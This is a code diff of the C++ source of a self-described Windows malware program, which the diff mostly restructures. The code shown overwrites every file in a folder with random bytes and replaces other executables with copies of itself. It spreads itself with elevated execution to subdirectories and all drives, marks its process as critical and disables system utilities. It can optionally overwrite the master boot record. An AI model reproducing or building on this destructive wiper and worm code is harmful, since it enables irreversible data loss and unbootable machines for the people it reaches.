@@ -42,266 +42,249 @@ INT APIENTRY wWinMain(
 	WCHAR szMfn[MAX_PATH];
 	GetModuleFileName(NULL, szMfn, MAX_PATH);
 
-	if (nArgs > 1) {
-		if (!lstrcmp(szArglist[1], L"/exec")) {
-// ######## Start of /exec ######## Malware Payload execution #######################################################################################
+	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { // ## Start of /exec ## Malware Payload execution ######################################
 #ifdef DEBUG_MSG
-			MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+		MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif // DEBUG_MSG
 
-			// Check if /host Mutex exists, if not: Exit Malware
-			HANDLE hSmpo = NULL;
-			if (fnCheckMutexW(szHOST_MUTEX)) {
-				// Check if /host Semaphore exists, if not: Exit Malware
-				hSmpo = fnCheckSemaphoreW(szHOST_SEMAPHORE);
-				BOOL bContinue = FALSE;
-				DWORD dwWFSO;
-				if (hSmpo) {
-					// Wait until Semaphore is available
-					while (!bContinue) {
-						dwWFSO = WaitForSingleObject(hSmpo, 100);
-						switch (dwWFSO) {
-						case WAIT_OBJECT_0:
-							bContinue = TRUE;
-							break;
-						case WAIT_TIMEOUT:
-							break;
-						case WAIT_FAILED:
+		// Check if /host Mutex exists, if not: Exit Malware
+		HANDLE hSmpo = NULL;
+		if (fnCheckMutexW(szHOST_MUTEX)) {
+			// Check if /host Semaphore exists, if not: Exit Malware
+			hSmpo = fnCheckSemaphoreW(szHOST_SEMAPHORE);
+			BOOL bContinue = FALSE;
+			DWORD dwWFSO;
+			if (hSmpo) {
+				// Wait until Semaphore is available
+				while (!bContinue) {
+					dwWFSO = WaitForSingleObject(hSmpo, 100);
+					switch (dwWFSO) {
+					case WAIT_OBJECT_0:
+						bContinue = TRUE;
+						break;
+					case WAIT_TIMEOUT:
+						break;
+					case WAIT_FAILED:
 #ifdef DEBUG_MSG
-							MessageBox(NULL, L"Wait failed", L"WaitForSingleObject", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+						MessageBox(NULL, L"Wait failed", L"WaitForSingleObject", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
-							HeapFree(hHeap, NULL, szArglist);
-							ExitProcess(EXIT_FAILURE);
-						}
+						HeapFree(hHeap, NULL, szArglist);
+						ExitProcess(EXIT_FAILURE);
 					}
-				} else {
-					// TODO: Remove this
-					// if no semaphoreobject is available then continue without
-					HeapFree(hHeap, NULL, szArglist);
-					ExitProcess(EXIT_FAILURE);
 				}
 			} else {
+				// TODO: Remove this
+				// if no semaphoreobject is available then continue without
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
+		} else {
+			HeapFree(hHeap, NULL, szArglist);
+			ExitProcess(EXIT_FAILURE);
+		}
 
-			//// BETA ////
-			// DirectoryIterat0r 1.0 //
-			std::vector<std::wstring> vszDir, vszFile;
-			if (fnDirectoryIteratorW(szCd, L"*", vszDir, vszFile)) {
-				// FileCorrupt0r 1.0 //
-				LARGE_INTEGER liFs;
-				DWORD dwNOBW;
-				for (std::wstring i : vszFile) {
-					HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
-					if (hFile) {
-						if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
-							if (lstrcmp(i.c_str(), szMfn)) {
-								if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
-									if (!CopyFile(szMfn, i.c_str(), FALSE)) {
+		//// BETA ////
+		// DirectoryIterat0r 1.0 //
+		std::vector<std::wstring> vszDir, vszFile;
+		if (fnDirectoryIteratorW(szCd, L"*", vszDir, vszFile)) {
+			// FileCorrupt0r 1.0 //
+			LARGE_INTEGER liFs;
+			DWORD dwNOBW;
+			for (std::wstring i : vszFile) {
+				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
+				if (hFile) {
+					if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
+						if (lstrcmp(i.c_str(), szMfn)) {
+							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
+								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
 #ifdef DEBUG_MSG
-//										MessageBox(NULL, pszDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
-#endif // DEBUG_MSG
-									}
-								} else {
-#ifdef DEBUG_MSG
-									MessageBox(NULL, L"Couldn't set File Attribute", L"SetFileAttributes", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
-#endif // DEBUG_MSG
-								}
-							}
-						} else if (GetFileSizeEx(hFile, &liFs)) {
-							// TODO: Rewrite this b*llshit
-							if (liFs.QuadPart <= nMAX_BUFFER_SIZE) {
-								PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];
-
-								if (BCryptGenRandom(NULL, (PBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
-#ifdef DEBUG_MSG
-									MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
-#endif // DEBUG_MSG
-									ZeroMemory(pszRdDs, liFs.QuadPart);
-								}
-
-								if (!WriteFile(hFile, pszRdDs, liFs.QuadPart, &dwNOBW, NULL)) {
-#ifdef DEBUG_MSG
-									MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+									//										MessageBox(NULL, pszDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
 								}
-
-								delete[] pszRdDs;
-							}
-							else {
-								PWCHAR pszRdCs = new WCHAR[nMAX_BUFFER_SIZE];
-
-								if (BCryptGenRandom(NULL, (PBYTE)pszRdCs, nMAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
+							} else {
 #ifdef DEBUG_MSG
-									MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
+								MessageBox(NULL, L"Couldn't set File Attribute", L"SetFileAttributes", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
-									ZeroMemory(pszRdCs, nMAX_BUFFER_SIZE);
-								}
-
-								if (!WriteFile(hFile, pszRdCs, nMAX_BUFFER_SIZE, &dwNOBW, NULL)) {
-#ifdef DEBUG_MSG
-									MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
-#endif // DEBUG_MSG
-								}
-
-								delete[] pszRdCs;
 							}
 						}
+					} else if (GetFileSizeEx(hFile, &liFs)) {
+						// TODO: Rewrite this b*llshit
+						if (liFs.QuadPart <= nMAX_BUFFER_SIZE) {
+							PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];
 
-						CloseHandle(hFile);
-					} else {
+							if (BCryptGenRandom(NULL, (LPBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
 #ifdef DEBUG_MSG
-						MessageBox(NULL, L"Couldn't open existing File", szMALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+								MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
+								ZeroMemory(pszRdDs, liFs.QuadPart);
+							}
+
+							if (!WriteFile(hFile, pszRdDs, liFs.QuadPart, &dwNOBW, NULL)) {
+#ifdef DEBUG_MSG
+								MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+#endif // DEBUG_MSG
+							}
+
+							delete[] pszRdDs;
+						} else {
+							PWCHAR pszRdCs = new WCHAR[nMAX_BUFFER_SIZE];
+
+							if (BCryptGenRandom(NULL, (LPBYTE)pszRdCs, nMAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
+#ifdef DEBUG_MSG
+								MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
+#endif // DEBUG_MSG
+								ZeroMemory(pszRdCs, nMAX_BUFFER_SIZE);
+							}
+
+							if (!WriteFile(hFile, pszRdCs, nMAX_BUFFER_SIZE, &dwNOBW, NULL)) {
+#ifdef DEBUG_MSG
+								MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+#endif // DEBUG_MSG
+							}
+
+							delete[] pszRdCs;
+						}
 					}
-				}
 
-				// DirectoryInfector
-				std::wstring szNfn;
-				for (std::wstring i : vszDir) {
-					szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
-					CopyFile(szMfn, szNfn.c_str(), FALSE);
-					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
-				}
-			}
-
-			if (hSmpo) {
-				ReleaseSemaphore(hSmpo, 1, NULL);
-			}
-			HeapFree(hHeap, NULL, szArglist);
-			ExitProcess(EXIT_SUCCESS);
-// ######## End of /exec ############################################################################################################################
-		} else if (!lstrcmp(szArglist[1], L"/host")) {
-// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
-#ifdef DEBUG_MSG
-			if (nArgs > 2) {
-				if (!lstrcmp(szArglist[2], L"/init")) {
-					MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+					CloseHandle(hFile);
 				} else {
-					MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+#ifdef DEBUG_MSG
+					MessageBox(NULL, L"Couldn't open existing File", szMALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+#endif // DEBUG_MSG
 				}
 			}
+
+			// DirectoryInfector
+			std::wstring szNfn;
+			for (std::wstring i : vszDir) {
+				szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
+				CopyFile(szMfn, szNfn.c_str(), FALSE);
+				ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
+			}
+		}
+
+		if (hSmpo) {
+			ReleaseSemaphore(hSmpo, 1, NULL);
+		}
+		HeapFree(hHeap, NULL, szArglist);
+		ExitProcess(EXIT_SUCCESS);
+// ######## End of /exec ############################################################################################################################
+	} else if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/host"))) { // ## Start of /host ## Malware Host with/without Malware initialization ########
+#ifdef DEBUG_MSG
+		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) {
+			MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+		} else {
+			MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+		}
 #endif // DEBUG_MSG
 
-			if (!fnIsUserAdmin()) {
+		if (!fnIsUserAdmin()) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Process isn't Administrator", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+			MessageBox(NULL, L"Process isn't Administrator", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
-				HeapFree(hHeap, NULL, szArglist);
-				ExitProcess(EXIT_FAILURE);
-			}
+			HeapFree(hHeap, NULL, szArglist);
+			ExitProcess(EXIT_FAILURE);
+		}
 
-			if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
+		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
+			MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
 #endif // DEBUG_MSG
-			}
+		}
 
 #ifndef DISABLE_MUTEX
-			// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
-			if (fnCheckMutexW(szHOST_MUTEX)) {
+		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
+		if (fnCheckMutexW(szHOST_MUTEX)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+			MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif // DEBUG_MSG
 
+			HeapFree(hHeap, NULL, szArglist);
+			ExitProcess(EXIT_FAILURE);
+		} else {
+			// Create /host Mutex for /exec operation
+			HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
+			if (!hMutex) {
+#ifdef DEBUG_MSG
+				MessageBox(NULL, L"Couldn't create /host Mutex", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+#endif // DEBUG_MSG
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
-			} else {
-				// Create /host Mutex for /exec operation
-				HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
-				if (!hMutex) {
-#ifdef DEBUG_MSG
-					MessageBox(NULL, L"Couldn't create /host Mutex", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-					HeapFree(hHeap, NULL, szArglist);
-					ExitProcess(EXIT_FAILURE);
-				}
 			}
+		}
 #endif // !DISABLE_MUTEX
 
 #ifndef DISABLE_SEMAPHORE
-			// Create /host Semaphore for /exec operation
-			HANDLE hSemaphore = CreateSemaphore(NULL, nSEMAPHORE, 5000, szHOST_SEMAPHORE);
-			if (!hSemaphore) {
+		// Create /host Semaphore for /exec operation
+		HANDLE hSemaphore = CreateSemaphore(NULL, nSEMAPHORE, 5000, szHOST_SEMAPHORE);
+		if (!hSemaphore) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Couldn't create /host Semaphore", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+			MessageBox(NULL, L"Couldn't create /host Semaphore", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
-				HeapFree(hHeap, NULL, szArglist);
-				ExitProcess(EXIT_FAILURE);
-			}
+			HeapFree(hHeap, NULL, szArglist);
+			ExitProcess(EXIT_FAILURE);
+		}
 #endif // !DISABLE_SEMAPHORE
 
 #ifndef DISABLE_NT_FUNCTIONS
-			// Set Process as critical
-			if (fnNTSetProcessIsCritical(TRUE)) {
+		// Set Process as critical
+		if (fnNTSetProcessIsCritical(TRUE)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
+			MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
 #endif // DEBUG_MSG
-			}
+		}
 #endif // !DISABLE_NT_FUNCTIONS
 
-			if (nArgs > 2) {
-				// Initialize the Malware
-				if (!lstrcmp(szArglist[2], L"/init")) {
+		// Initialize the Malware
+		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) { // ## Start of /init ## Malware initialization #####################################
 #ifdef KILL_MBR
-					fnOverwriteMBR();
+			fnOverwriteMBR();
 #endif // KILL_MBR
 #ifndef DISABLE_REG_PROTECTIONS
-					fnDisableUtilities();
+			fnDisableUtilities();
 #endif // !DISABLE_REG_PROTECTIONS
 
-					// Enumerate Drives
-					std::vector<std::wstring> vszDrives;
-					std::wstring szNfn;
-					if (fnDriveEnumeratorW(vszDrives)) {
-						// Copy & Execute Malware in all enumerated Drives
-						for (std::wstring i : vszDrives) {
-							szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
+			// Enumerate Drives
+			std::vector<std::wstring> vszDrives;
+			std::wstring szNfn;
+			if (fnDriveEnumeratorW(vszDrives)) {
+				// Copy & Execute Malware in all enumerated Drives
+				for (std::wstring i : vszDrives) {
+					szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 
-							if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
-								ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
-							} else {
-#ifdef DEBUG_MSG
-								MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-							}
-						}
+					if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
+						ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 					} else {
-						// If DriveEnumerator fails, try C:\ Directory
-						szNfn = L"C:\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
-
-						if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
-							ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
-						} else {
 #ifdef DEBUG_MSG
-							MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+						MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
-						}
 					}
+				}
+			} else {
+				// If DriveEnumerator fails, try C:\ Directory
+				szNfn = L"C:\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 
-					// Create Registry Key
-					if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
-						if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
-
-						}
-					}
+				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
+					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
+				} else {
+#ifdef DEBUG_MSG
+					MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+#endif // DEBUG_MSG
 				}
 			}
 
-			// Deadlock
-			HeapFree(hHeap, NULL, szArglist);
+			// Create Registry Key
+			if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
+				if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
 
-			BOOL count;
-			for (;;) {
-				count = ReleaseSemaphore(hSemaphore, 0, NULL);
-				LPVOID dont = new LPWSTR[2000];
-				StringCchPrintf((LPWSTR)dont, 2000, L"%d", count);
-				MessageBox(NULL, (LPCWSTR)dont, NULL, MB_OK);
-//				Sleep(INFINITE);
+				}
 			}
-		} // ######## End of /host ##################################################################################################################
-	}
+		} // ######## End of /init ##################################################################################################################
+
+		// Deadlock
+		HeapFree(hHeap, NULL, szArglist);
+		Sleep(INFINITE);
+	} // ######## End of /host ######################################################################################################################
 
 	// If no Arguments were passed ...
 
